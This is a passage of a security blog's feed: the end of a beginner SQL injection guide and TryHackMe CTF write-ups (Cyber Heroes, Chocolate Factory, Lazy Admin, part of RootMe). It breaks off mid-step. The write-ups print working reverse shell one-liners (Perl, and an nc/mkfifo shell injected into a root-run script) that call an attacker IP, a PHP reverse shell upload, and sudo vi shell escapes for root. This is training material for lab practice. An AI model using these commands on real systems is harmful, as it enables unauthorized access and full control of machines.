  <li><a href="https://www.yazilimkodlama.com/sql-server-2/sql-sorgulari-ve-ornekleri/">Yazƒ±lƒ±m Kodlama - SQL Sorgularƒ± ve SQL Sorgu √ñrnekleri</a></li>
  <li><a href="https://cheatography.com/neolex/cheat-sheets/injection-sql/">Cheatography - Injection SQL Cheat Sheet by Neolex</a></li>
  <li><a href="https://cheatography.com/nimakarimian/cheat-sheets/sql-cheatsheet/">Cheatography - SQL CheatSheet Cheat Sheet by nimakarimian</a></li>
  <li><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">INVICTI - SQL Injection Cheat Sheet</a></li>
  <li><a href="https://deadlyhacker.wordpress.com/2013/05/09/list-of-google-dorks-for-sql-injection/">Deadly Hacker - List of google dorks for sql injection</a></li>
  <li><a href="https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/">Perspective Risk - MySQL SQL Injection Practical Cheat Sheet</a></li>
  <li><a href="https://www.asafety.fr/mysql-injection-cheat-sheet/">MySQL Injection Cheat Sheet</a></li>
</ul>

<p><br />
<br />
I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="sql injection, sqli guide" /><summary type="html"><![CDATA[In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level. So, I preferred a shorter and clearer explanation. But it would not be right for me to give only the basic information in my article. I want you to understand the basics, and let the SQL injection fit your logic. So, there are many resources that I have shared in this article, check them out. There are many labs where you can practice your knowledge. I also shared a lot of cheat sheets as a helper. I hope the article is useful to you. It helps you to learn SQL injection :worried: Topics Basic First SQL Injection and Types SQL Injection Labs SQL Injection Sources SQL Injection Cheat Sheats Basic First What is a Database? A database is where all kinds of data and information are stored electronically. What is Database Management System (DBMS)? The database is usually controlled by a Database Management System (DBMS). Thanks to this system, data can be easily accessed, managed, changed, updated, and organized. Most databases today use SQL. What is SQL? SQL is a programming language used in databases to query, manipulate and define data, as well as to provide access control. SQL Injection and Types A web application sends SQL queries to use data found in the database. The attacker can inject their own queries into these SQL queries or manipulate the queries. In this case, it can access other information stored in the database. We call this situation the SQL Injection vulnerability. A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. In some cases, an attacker can obtain a persistent backdoor into an organization‚Äôs systems, leading to a long-term compromise that can go unnoticed for an extended period. Error-Based SQLi An error is received in response to submitted SQL queries. The attacker can also send new queries according to this error, or by manipulating the error, he can reach the information he wants to reach from within the output. Union-Based SQLi Multiple Select queries can be written using the Union operator. In this case, the attacker can write his own SELECT query with a union operator. But it should be noted that when the union expression is used, the number of columns must be equal to each other. Boolean-Based SQLi It does not return an error or requested information in response to submitted SQL queries. Instead, it gives a true or false answer. This makes the process very long. Time-Based SQLi It doesn‚Äôt return anything in response to submitted SQL queries. However, the attacker tries to see if the query works by adding functions such as sleep() to these SQL queries. Out-of-Ban SQLi None of the techniques described so far will work. The application‚Äôs response doesn‚Äôt depend on whether the query returns any data, on whether a database error occurs or on the time taken to execute the query. In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions with a system that you control. These can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself. Various network protocols can be used for this purpose, but typically the most effective is DNS. Warning Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you‚Äôre injecting into, it‚Äôs common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data. SQL Injection Labs Web Security Academy - All Labs TryHackMe - SQL Injection Lab TryHackMe - OWASP Juice Shop TryHackMe - SQL Injection TryHackMe - Sqlmap TryHackMe - Game Zone TryHackMe - Poster TryHackMe - Chill Hack - My Writeup :punch: TryHackMe - Gallery - My Writeup :punch: TryHackMe - Avengers Blog TryHackMe - The Marketplace - My Writeup :punch: TryHackMe - Wekor TryHackMe - Zeno TryHackMe - SQHell TryHackMe - Olympus TryHackMe - Revenge TryHackMe - Metamorphosis TryHackMe - WWBuddy TryHackMe - Unstable Twin TryHackMe - Daily Bugle - My Writeup :punch: TryHackMe - Year of the Dog TryHackMe - Year of the Pig TryHackMe - M4tr1x: Exit Denied PentesterLab - From SQL Injection to Shell PentesterLab - From SQL Injection to Shell: PostgreSQL Edition CTFLearn - Basic Injection CTFLearn - Inj3ction Time SQL Injection Sources Web Security Academy - SQL injection TryHackMe - SQL Injection HackerRank - SQL OWASP - SQL Injection Niveet Palan - Handbook for SQL Injection Graham Zemel - Step by Step Guide to SQL Injection Raj Chandel‚Äôs Blog - Manual SQL Injection Exploitation Step by Step Atmanand Nagpure - A technique that a lot of SQL injection beginners don‚Äôt know goswamiijaya - Identifying &amp; Exploiting SQL Injections: Manual &amp; Automated daffainfo - SQL Injection Security Lit Limited - Definitive Guide to SQL Injection goswamiijaya - Exploiting Error Based SQL Injections &amp; Bypassing Restrictions Lee Chun How - Out-of-Band (OOB) SQL Injection Mcry - First step to an SQL-Injection Secpy Community - SQL Injection: An Overview Frost - What is SQL Injection and How Does it Work Kontra Application Security - SQL Injection Start - SQL Injections CTFlearn - SQL Injection Imperva - What is SQL Injection Edward Low - Edward Low Sudarshan S - SQL INJECTION: IMPORTANT‚Ä¶ Arth Detroja - SQL Injection A51F221B - Web penetration testing guide W3Schools - SQL Tutorial Codecademy - Learn SQL Programiz - Learn SQL: SQL Tutorial for Beginners TutorialsPoint - SQL Tutorial Cyber Security Roadmap SQL Injection Cheat Sheets Web Security Academy - SQL Injection Cheat Sheet Ismail Tasdelen - SQL Injection Payload List NetSPI SQL Injection Wiki Pentestmonkey - Oracle SQL Injection Cheat Sheet Pentestmonkey - MySQL SQL Injection Cheat Sheet Pentestmonkey - Postgres SQL Injection Cheat Sheet Pentestmonkey - Informix SQL Injection Cheat Sheet Pentestmonkey - MSSQL Injection Cheat Sheet Pentestmonkey - DB2 SQL Injection Cheat Sheet Pentestmonkey - Ingres SQL Injection Cheat Sheet Codecademy - Preventing SQL Injection Attacks Exploiting hard filtered SQL Injections MS Access SQL Injection Cheat Sheet Yazƒ±lƒ±m Kodlama - SQL Sorgularƒ± ve SQL Sorgu √ñrnekleri Cheatography - Injection SQL Cheat Sheet by Neolex Cheatography - SQL CheatSheet Cheat Sheet by nimakarimian INVICTI - SQL Injection Cheat Sheet Deadly Hacker - List of google dorks for sql injection Perspective Risk - MySQL SQL Injection Practical Cheat Sheet MySQL Injection Cheat Sheet I hope you liked my article. See you in my other articles:hand:]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqli.png" /><media:content medium="image" url="http://localhost:4000/assets/img/sqli.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>

<p><br /></p>

<h2 id="1-cyberheroes">1. CyberHeroes</h2>

<p><br /></p>

<h3 id="11-uncover-the-flag">1.1 Uncover the flag!</h3>

<p>Let‚Äôs do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.39.168
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/cyber-heroes/nmap.png" alt="nmap" /></p>

<p>Two ports are open. Theese are <code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code>.</p>

<p>Let‚Äôs visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>I found three pages on the website. These are <code class="language-plaintext highlighter-rouge">Home, About, and Login</code>.</p>

<p>Let‚Äôs look at them all.</p>

<ul>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">Home</code></strong></em></p>

    <p><img src="/assets/img/tryhackme/cyber-heroes/home.png" alt="home" /></p>

    <p>I check the source page but I don‚Äôt see anything significant.</p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">About</code></strong></em></p>

    <p>I don‚Äôt see anything significant on the page.</p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">Login</code></strong></em></p>

    <p><img src="/assets/img/tryhackme/cyber-heroes/login.png" alt="login" /></p>

    <p>I check the source page and I found this script.</p>

    <p><img src="/assets/img/tryhackme/cyber-heroes/source.png" alt="source" /></p>

    <p>As I understand it <code class="language-plaintext highlighter-rouge">username: h3ck3rBoi</code> and <code class="language-plaintext highlighter-rouge">password: RevereString("*****@t*****r****")</code>.</p>

    <p>We need to write the password in reverse. So, <code class="language-plaintext highlighter-rouge">password: S****S*****@*****</code></p>
  </li>
</ul>

<p>Now that we‚Äôve found the username and password, let‚Äôs log in.</p>

<p>And the flag is here.</p>

<p><img src="/assets/img/tryhackme/cyber-heroes/flag.png" alt="flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that‚Äôs it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, security, credential" /><summary type="html"><![CDATA[Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/cyber-heroes.png" /><media:content medium="image" url="http://localhost:4000/assets/img/cyber-heroes.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Chocolate Factory</title><link href="http://localhost:4000/tryhackme-chocolate-factory/" rel="alternate" type="text/html" title="TryHackMe Chocolate Factory" /><published>2023-03-29T00:00:00+03:00</published><updated>2023-03-29T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-chocolate-factory</id><content type="html" xml:base="http://localhost:4000/tryhackme-chocolate-factory/"><![CDATA[<p>A Charlie And The Chocolate Factory themed room, revisit Willy Wonka‚Äôs chocolate factory!</p>

<p><br /></p>

<h2 id="1-introduction">1. Introduction</h2>

<p>Welcome to Willy Wonka‚Äôs Chocolate Factory!</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/golden-ticket.jpg" alt="golden-ticket" /></p>

<p>This room was designed so that hackers can revisit the Willy Wonka‚Äôs Chocolate Factory and meet Oompa Loompa</p>

<p>This is a beginner friendly room!</p>

<p>If you have any issues / queries you can reach us through Discord or Twitter.</p>

<p>( Created by AndyInfosec team for the community! )</p>

<p><br /></p>

<h2 id="2-challenges">2. Challenges</h2>

<p><br /></p>

<h3 id="21-enter-the-key-you-found">2.1 Enter the key you found!</h3>

<p>Let‚Äôs do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.153.7
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/nmap.png" alt="nmap" /></p>

<p>A lot of ports are open.</p>

<p>Let‚Äôs visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/home.png" alt="home" /></p>

<p>I see a login page. Let‚Äôs do a gobuster scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.153.7/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/gobuster.png" alt="gobuster" /></p>

<p>We found a few php files. First, let‚Äôs look at <code class="language-plaintext highlighter-rouge">home.php</code>.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/php.png" alt="php" /></p>

<p>We can run commands on this page. Let‚Äôs connect with burp suite. Capture the page and send it to the repeater.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/ls.png" alt="ls" /></p>

<p>Let‚Äôs look at the files in the directory in order, of what we will find.</p>

<ul>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">index.php.bak</code></strong></em></p>

    <p>I don‚Äôt see anything significant here.</p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/bak.png" alt="bak" /></p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">key_rev_key</code></strong></em></p>

    <p>This file is probably a script because the cat command doesn‚Äôt work.</p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/key-rev-key.png" alt="key-rev-key" /></p>

    <p>Let‚Äôs back to the website and download the key-rev-key file. <a href="http://10.10.153.7/key_rev_key">http://10.10.153.7/key_rev_key</a></p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/cat.png" alt="cat" /></p>

    <p>Let‚Äôs try.</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ chmod +x key_rev_key
 $ ./key_rev_key 
</code></pre></div>    </div>

    <p><img src="/assets/img/tryhackme/chocolate-factory/try.png" alt="try" /></p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ strings key_rev_key
</code></pre></div>    </div>

    <p><img src="/assets/img/tryhackme/chocolate-factory/strings.png" alt="strings" /></p>

    <p>Let‚Äôs try the name <code class="language-plaintext highlighter-rouge">laksdhfas</code>.</p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/key.png" alt="key" /></p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">validate.php</code></strong></em></p>

    <p>We found the username and password for the website.</p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/validate.png" alt="validate" /></p>
  </li>
</ul>

<p><br /></p>

<h3 id="22-what-is-charlies-password">2.2 What is Charlie‚Äôs password?</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: c*****</code></strong></p>

<p><br /></p>

<h3 id="23-change-user-to-charlie">2.3 Change user to charlie</h3>

<p>Now, we can execute a reverse-shell command on home.php. First, let‚Äôs go to the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey‚Äôs cheat sheet</a>. You can try all of them.</p>

<p>Perl, python, and netcat are working.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/shell.png" alt="shell" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.8.86.168";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre></div></div>

<p>First, let‚Äôs setup a netcat listener.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>After copying and pasting.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/reverse.png" alt="reverse" /></p>

<p>We are inside.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/inside-first.png" alt="inside-first" /></p>

<p>Now, we can change the user to charlie.</p>

<p>We found a RSA key in charlie‚Äôs directory</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/charlie/teleport
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/rsa.png" alt="rsa" /></p>

<p>Let‚Äôs connect to charlie ssh.</p>

<p>First, create an id_rsa file on your own machine and copy rsa key on the target machine, and paste it into the id_rsa file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x id_rsa
$ ssh -i id_rsa charlie@10.10.153.7
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/ssh.png" alt="ssh" /></p>

<p>And we are inside.</p>

<p><br /></p>

<h3 id="24-enter-the-user-flag">2.4 Enter the user flag</h3>

<p>Now, let‚Äôs get the user flag.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="25-enter-the-root-flag">2.5 Enter the root flag</h3>

<p>Now, we checking the sudo privileges.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/sudo-l.png" alt="sudo-l" /></p>

<p>We can get root privileges using vi. I‚Äôm going to <a href="https://gtfobins.github.io/gtfobins/vi/">gtfobins</a> and see what I can do with vi.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/gtfobins.png" alt="gtfobins" /></p>

<p>Now, we can root privilege using this command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c ':!/bin/sh' /dev/null
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/privesc.png" alt="privesc" /></p>

<p>We are inside. Let‚Äôs get the root flag.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that‚Äôs it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, privesc, stego" /><summary type="html"><![CDATA[A Charlie And The Chocolate Factory themed room, revisit Willy Wonka‚Äôs chocolate factory!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Lazy Admin</title><link href="http://localhost:4000/tryhackme-lazy-admin/" rel="alternate" type="text/html" title="TryHackMe - Lazy Admin" /><published>2023-03-28T00:00:00+03:00</published><updated>2023-03-28T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-lazy-admin</id><content type="html" xml:base="http://localhost:4000/tryhackme-lazy-admin/"><![CDATA[<p>Easy linux machine to practice your skills</p>

<p><br /></p>

<h2 id="1-lazy-admin">1. Lazy Admin</h2>

<p>Have some fun! There might be multiple ways to get user access.</p>

<p><br /></p>

<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>

<p>Let‚Äôs do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.221.70
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>

<p>Let‚Äôs visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>I see an apache default page on the website.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/apache.png" alt="apache" /></p>

<p>Let‚Äôs do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan for the website.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-one.png" alt="gobuster-one" /></p>

<p>We found the  <code class="language-plaintext highlighter-rouge">/content/</code> directory. Let‚Äôs go to the directory.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/content.png" alt="content" /></p>

<p>This website uses <code class="language-plaintext highlighter-rouge">SweetRice</code> and it seems to be closed.</p>

<p>So, I try another gobuster scan on this directory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/content/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-content.png" alt="gobuster-content" /></p>

<p>We found a few directories here. Let‚Äôs examine all directories.</p>

<ul>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">/inc/</code></strong></em></p>

    <p>We found a lot of files in this directory.</p>

    <p><img src="/assets/img/tryhackme/lazy-admin/inc.png" alt="inc" /></p>

    <p>I found lastest.txt. It seems <code class="language-plaintext highlighter-rouge">SweetRice's</code> running version is <code class="language-plaintext highlighter-rouge">1.5.1.</code> Maybe this version is vulnerable.</p>

    <p><img src="/assets/img/tryhackme/lazy-admin/lastest.png" alt="lastest" /></p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">/as/</code></strong></em></p>

    <p>We found a login page here.</p>

    <p><img src="/assets/img/tryhackme/lazy-admin/as.png" alt="as" /></p>
  </li>
</ul>

<p><br /></p>

<p>I searched SweetRice in <a href="https://www.exploit-db.com/">exploit-db</a>.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/search.png" alt="search" /></p>

<p>I am looking to the first. <a href="https://www.exploit-db.com/exploits/40718">SweetRice 1.5.1 - Backup Disclosure</a></p>

<p><img src="/assets/img/tryhackme/lazy-admin/first.png" alt="first" /></p>

<p>According to the vulnerability, there is a msql_backup file under the /inc/ directory.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/say.png" alt="say" /></p>

<p>Let‚Äôs go and see.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/back.png" alt="back" /></p>

<p>Let‚Äôs go to the /mysql_backup/ directory.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/sql-file.png" alt="sql-file" /></p>

<p>Let‚Äôs see what‚Äôs inside this file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat mysql_bakup_20191129023059-1.5.1.sql
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/sql-inside.png" alt="sql-inside" /></p>

<p>We found two important things here.</p>

<p><em><strong><code class="language-plaintext highlighter-rouge">Admin: manager</code></strong></em></p>

<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: 42f749ade7f9e195bf475f37a44cafcb</code></strong></em></p>

<p>It seems the password is a hash. Let‚Äôs identify and crack this hash.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/hash-id.png" alt="hash-id" /></p>

<p>This password is encrypted using <strong><code class="language-plaintext highlighter-rouge">MD5</code></strong>.</p>

<p>Let‚Äôs crack. <a href="https://md5decrypt.net/">https://md5decrypt.net/</a></p>

<p><img src="/assets/img/tryhackme/lazy-admin/crack-hash.png" alt="crack-hash" /></p>

<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: *******</code></strong></em></p>

<p>Now we can log in as an admin user. Let‚Äôs go to the /as/ directory and log in.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/home.png" alt="home" /></p>

<p>Now we can upload a reverse shell. So, I download pentest monkey‚Äôs <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a> and edit the php file. <code class="language-plaintext highlighter-rouge">($ip and $port)</code></p>

<p>Then we go to the Post &gt; Create</p>

<p><img src="/assets/img/tryhackme/lazy-admin/post-create.png" alt="post-create" /></p>

<p>After, we can add a file below the page. (.php file isn‚Äôt working you must change the extension.)</p>

<p><img src="/assets/img/tryhackme/lazy-admin/below.png" alt="below" /></p>

<p>After the upload, the page looks like this.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/upload.png" alt="upload" /></p>

<p>Now, we set up a netcat listener.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 
</code></pre></div></div>

<p>Then we go to the <a href="http://10.10.103.31/content/attachment/shell.phtml">http://10.10.103.31/content/attachment/shell.phtml</a></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/inside.png" alt="inside" /></p>

<p>Now, let‚Äôs get to the user flag.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="12-what-is-the-root-flag">1.2 What is the root flag?</h3>

<p>Very surprisingly for www-data, we have sudo privileges.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/sudo-l.png" alt="sudo-l" /></p>

<p>The backup script is a Perl script that calls /etc/copy.sh</p>

<p><img src="/assets/img/tryhackme/lazy-admin/copy.png" alt="copy" /></p>

<p>Now we edit this copy.sh, file to get the root privilege.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; /etc/copy.sh 
</code></pre></div></div>

<p>Let‚Äôs setup a netcat listener.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 5555 
</code></pre></div></div>

<p>Let‚Äôs run the backup.pl file and get the root privilege.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo perl /home/itguy/backup.pl
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/privesc.png" alt="privesc" /></p>

<p>We are inside. Let‚Äôs get the root flag.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that‚Äôs it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="security, linux" /><summary type="html"><![CDATA[Easy linux machine to practice your skills]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/lazy-admin.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/lazy-admin.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - RootMe</title><link href="http://localhost:4000/tryhackme-rootme/" rel="alternate" type="text/html" title="TryHackMe - RootMe" /><published>2023-03-27T00:00:00+03:00</published><updated>2023-03-27T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-rootme</id><content type="html" xml:base="http://localhost:4000/tryhackme-rootme/"><![CDATA[<p>A ctf for beginners, can you root me?</p>

<p><br /></p>

<h2 id="1-deploy-the-machine">1. Deploy the machine</h2>

<p>Connect to TryHackMe network and deploy the machine. If you don‚Äôt know how to do this, complete the OpenVPN room first.</p>

<p><br /></p>

<h2 id="2-reconnaissance">2 Reconnaissance</h2>

<p>First, let‚Äôs get information about the target.</p>

<p><br /></p>

<h3 id="21-scan-the-machine-how-many-ports-are-open">2.1 Scan the machine, how many ports are open?</h3>

<p>Let‚Äôs do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.226.173
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/rootme/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: 2</code></strong></p>

<p><br /></p>

<h3 id="22-what-version-of-apache-is-running">2.2 What version of Apache is running?</h3>

<p><img src="/assets/img/tryhackme/rootme/apache.png" alt="apache" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: 2.4.29</code></strong></p>

<p><br /></p>

<h3 id="23-what-service-is-running-on-port-22">2.3 What service is running on port 22?</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: SSH</code></strong></p>

<p><br /></p>

<h3 id="24-find-directories-on-the-web-server-using-the-gobuster-tool">2.4 Find directories on the web server using the GoBuster tool.</h3>

<p>I am visiting the website running on port 80. I see a page like this:</p>

<p><img src="/assets/img/tryhackme/rootme/home.png" alt="home" /></p>

<p>Let‚Äôs do a gobuster scan for this website.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.226.173/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><br /></p>

<h3 id="25-what-is-the-hidden-directory">2.5 What is the hidden directory?</h3>

<p><img src="/assets/img/tryhackme/rootme/gobuster.png" alt="gobuster" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: /panel/</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="3-getting-a-shell">3 Getting a shell</h2>

<p>Find a form to upload and get a reverse shell, and find the flag.</p>

<p><br /></p>

<h3 id="31-usertxt">3.1 user.txt</h3>

<p>I check the /uploads/ directory but nothing in here.</p>

<p><img src="/assets/img/tryhackme/rootme/uploads.png" alt="uploads" /></p>

<p>I am going to the /panel/ directory.</p>

<p><img src="/assets/img/tryhackme/rootme/panel.png" alt="panel" /></p>

<p>We upload files here. Then let‚Äôs do this:</p>
<ul>
  <li>Let‚Äôs download pentestmonkey‚Äôs php-reverse-shell.php file. <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Here</a>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</code></pre></div>    </div>
  </li>
  <li>
    <p>Now, edit the php-reverse-shell.php file.</p>

